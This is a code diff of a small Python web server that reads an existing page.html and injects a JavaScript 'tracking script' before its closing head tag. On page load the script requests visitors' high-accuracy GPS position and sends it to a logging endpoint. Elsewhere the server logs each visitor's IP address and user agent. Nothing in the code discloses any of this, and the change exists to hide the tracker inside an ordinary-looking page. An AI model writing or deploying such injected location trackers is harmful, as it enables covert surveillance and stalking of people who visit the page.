@@ -17,56 +17,58 @@ def serve_page():
     # Log the IP and user agent
     logger.info(f"Visitor IP: {client_ip}, User Agent: {user_agent}")
     
-    # Serve the HTML page with injected JavaScript
-    return f"""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Location Service</title>
-        <script>
-            // Function to request GPS permission and log location
-            function requestLocation() {{
-                if (navigator.geolocation) {{
-                    navigator.geolocation.getCurrentPosition(
-                        function(position) {{
-                            // Log successful location
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            fetch('/log_location?lat=' + lat + '&lon=' + lon, {{ 
-                                method: 'GET',
-                                mode: 'no-cors'
-                            }});
-                        }},
-                        function(error) {{
-                            // Log error
-                            fetch('/log_error?code=' + error.code, {{ 
-                                method: 'GET',
-                                mode: 'no-cors'
-                            }});
-                        }},
-                        {{
-                            enableHighAccuracy: true,
-                            maximumAge: 0,
-                            timeout: 5000
-                        }}
-                    );
-                }} else {{
-                    fetch('/log_error?code=unsupported', {{ 
-                        method: 'GET',
-                        mode: 'no-cors'
-                    }});
-                }}
-            }}
-            
-            // Request location when page loads
-            window.onload = requestLocation;
-        </script>
-    </head>
-    <body>
-        <h1>Loading location services...</h1>
-    </body>
-    </html>
+    # Read your existing page.html
+    try:
+        with open('page.html', 'r') as f:
+            html_content = f.read()
+    except FileNotFoundError:
+        html_content = "<html><body>Default page - page.html not found</body></html>"
+    
+    # Inject the tracking script right before the closing </head> tag
+    tracking_script = """
+    <script>
+        // Function to request GPS permission and log location
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Log successful location
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        fetch('/log_location?lat=' + lat + '&lon=' + lon, { 
+                            method: 'GET',
+                            mode: 'no-cors'
+                        });
+                    },
+                    function(error) {
+                        // Log error
+                        fetch('/log_error?code=' + error.code, { 
+                            method: 'GET',
+                            mode: 'no-cors'
+                        });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        maximumAge: 0,
+                        timeout: 5000
+                    }
+                );
+            } else {
+                fetch('/log_error?code=unsupported', { 
+                    method: 'GET',
+                    mode: 'no-cors'
+                });
+            }
+        }
+        
+        // Request location when page loads
+        window.onload = requestLocation;
+    </script>
     """
+    
+    # Insert the script and return the modified page
+    modified_html = html_content.replace('</head>', tracking_script + '</head>')
+    return modified_html
 
 @app.route('/log_location')
 def log_location():
